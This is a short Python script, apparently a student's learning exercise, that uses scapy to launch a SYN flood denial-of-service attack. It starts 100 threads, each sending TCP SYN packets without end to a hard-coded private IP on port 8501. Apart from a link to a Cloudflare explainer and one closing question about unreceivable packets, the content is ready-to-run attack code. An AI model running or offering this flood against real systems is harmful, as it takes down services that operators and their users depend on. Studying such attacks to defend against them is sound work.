""" Check this out: https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/ """

import threading
from scapy.all import *

target_ip = "10.22.135.115"   # Target IP address
target_port = 8501              # Target port (HTTP)


def send_syn_flood(target_ip, target_port):
    """SYN flood attack"""
    ip_packet = IP(dst=target_ip)
    
    tcp_packet = TCP(dport=target_port, flags="S")
    
    packet = ip_packet / tcp_packet
    
    while True:
        send(packet, verbose=False)

thread_count = 100 
threads = []

for i in range(thread_count):
    thread = threading.Thread(target=send_syn_flood, args=(target_ip, target_port))
    thread.start()
    threads.append(thread)

print(f"Started SYN flood attack on {target_ip}:{target_port} with {thread_count} threads.")



""" QUESTIONS: what if you send packets that cant be received?"""